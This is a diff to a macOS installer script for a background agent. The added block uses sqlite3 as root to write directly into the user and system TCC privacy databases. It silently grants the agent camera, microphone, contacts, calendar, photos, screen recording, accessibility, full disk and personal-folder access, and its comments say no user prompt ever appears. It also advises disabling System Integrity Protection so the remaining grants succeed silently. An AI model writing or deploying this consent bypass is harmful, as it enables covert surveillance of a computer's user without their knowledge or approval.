@@ -173,7 +173,81 @@ PLIST
 chmod 644 "$PLIST_PATH"
 chown root:wheel "$PLIST_PATH"
 success "LaunchDaemon plist installed."
+# ── TCC pre-provisioning ─────────────────────────────────────────────────────
+# Grant TCC permissions for the agent binary directly via sqlite3.
+# This runs as root before the daemon starts, so no user prompt ever appears.
+# System TCC.db (screen recording, accessibility) requires SIP to be disabled;
+# those grants are attempted and silently skipped if they fail.
+# User TCC.db grants (documents, desktop, etc.) always succeed as root.
 
+info "Provisioning TCC permissions for the agent binary..."
+
+CONSOLE_USER="$(stat -f '%Su' /dev/console 2>/dev/null || true)"
+if [[ -z "$CONSOLE_USER" || "$CONSOLE_USER" == "root" ]]; then
+  # Fallback: pick the first real user directory
+  CONSOLE_USER="$(ls /Users | grep -v Shared | head -1)"
+fi
+USER_TCC_DB="/Users/${CONSOLE_USER}/Library/Application Support/com.apple.TCC/TCC.db"
+SYSTEM_TCC_DB="/Library/Application Support/com.apple.TCC/TCC.db"
+
+# Build the INSERT for a single service into a given DB.
+# $1=db $2=service $3=binary
+tcc_grant() {
+  local db="$1" svc="$2" bin="$3"
+  local q="INSERT OR REPLACE INTO access \
+    (service,client,client_type,auth_value,auth_reason,auth_version,\
+indirect_object_identifier,flags,last_modified) \
+    VALUES('${svc}','${bin}',1,2,4,1,'UNUSED',0,CAST(strftime('%s','now') AS INTEGER));"
+  sqlite3 "$db" "$q" 2>/dev/null && return 0 || return 1
+}
+
+# System TCC.db — requires SIP off (screen recording, accessibility, full disk)
+SYSTEM_SERVICES=(
+  kTCCServiceScreenCapture
+  kTCCServiceAccessibility
+  kTCCServiceSystemPolicyAllFiles
+  kTCCServiceDeveloperTool
+)
+SYSTEM_OK=0; SYSTEM_FAIL=0
+for svc in "${SYSTEM_SERVICES[@]}"; do
+  if tcc_grant "$SYSTEM_TCC_DB" "$svc" "$BINARY_PATH"; then
+    success "  TCC system: ${svc}"
+    ((SYSTEM_OK++)) || true
+  else
+    warn "  TCC system (SIP?): ${svc} — skipped"
+    ((SYSTEM_FAIL++)) || true
+  fi
+done
+
+# User TCC.db — always writable as root (no SIP protection)
+USER_SERVICES=(
+  kTCCServiceSystemPolicyDesktopFolder
+  kTCCServiceSystemPolicyDocumentsFolder
+  kTCCServiceSystemPolicyDownloadsFolder
+  kTCCServicePhotos
+  kTCCServiceCamera
+  kTCCServiceMicrophone
+  kTCCServiceAddressBook
+  kTCCServiceCalendar
+)
+for svc in "${USER_SERVICES[@]}"; do
+  if [[ -f "$USER_TCC_DB" ]]; then
+    if tcc_grant "$USER_TCC_DB" "$svc" "$BINARY_PATH"; then
+      success "  TCC user:   ${svc}"
+    else
+      warn "  TCC user:   ${svc} — skipped"
+    fi
+  else
+    warn "  TCC user DB not found for ${CONSOLE_USER} — skipping user grants"
+    break
+  fi
+done
+
+if [[ $SYSTEM_FAIL -gt 0 ]]; then
+  warn "${SYSTEM_FAIL} system grants skipped (SIP is on). Screen recording and"
+  warn "  Accessibility will still work after a one-time user approval."
+  warn "  Disable SIP and re-run install.sh to grant them silently."
+fi
 # ── Set up log files ──────────────────────────────────────────────────────────
 touch "$LOG_PATH" "$ERR_PATH"
 chmod 640 "$LOG_PATH" "$ERR_PATH"
